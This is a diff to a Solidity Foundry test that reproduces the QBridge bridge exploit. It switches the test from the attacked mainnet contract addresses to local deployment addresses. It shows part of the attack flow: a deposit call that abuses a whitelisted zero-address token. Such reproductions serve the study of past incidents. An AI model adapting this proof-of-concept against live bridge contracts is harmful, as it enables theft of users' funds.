@@ -20,8 +20,11 @@ contract ContractTest is DSTest {
   CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
   address attacker = 0xD01Ae1A708614948B2B5e0B7AB5be6AFA01325c7;
  //contracts sourcecoodee: https://github.com/ChainSafe/chainbridge-solidity/blob/master/contracts/handlers/ERC20Handler.sol
-  address QBridge = 0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6;
-  address QBridgeHandler = 0x17B7163cf1Dbd286E262ddc68b553D899B93f526;
+  
+  //attacked version: 0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6; 
+  address QBridge =  0x5FC8d32690cc91D4c39d9d3abcBD16989F875707; 
+  //attacked version: 0x17B7163cf1Dbd286E262ddc68b553D899B93f526; 
+  address QBridgeHandler =  0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9; 
 
   CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
@@ -44,7 +47,7 @@ contract ContractTest is DSTest {
     emit log_named_uint("amount", amount);
     // which calls in turn:
     // IQBridgeHandler(QBridgeHandler).deposit(resourceID, attacker, data);
-    emit log_named_address("contractAddress", IQBridgeHandler(QBridgeHandler).resourceIDToTokenContractAddress(resourceID));
+    //emit log_named_address("contractAddress", IQBridgeHandler(QBridgeHandler).resourceIDToTokenContractAddress(resourceID));
     emit log_named_uint("is 0 address whitelisted", IQBridgeHandler(QBridgeHandler).contractWhitelist(address(0)) ? 1 : 0);
 
     IQBridge(QBridge).deposit(1, resourceID, data);
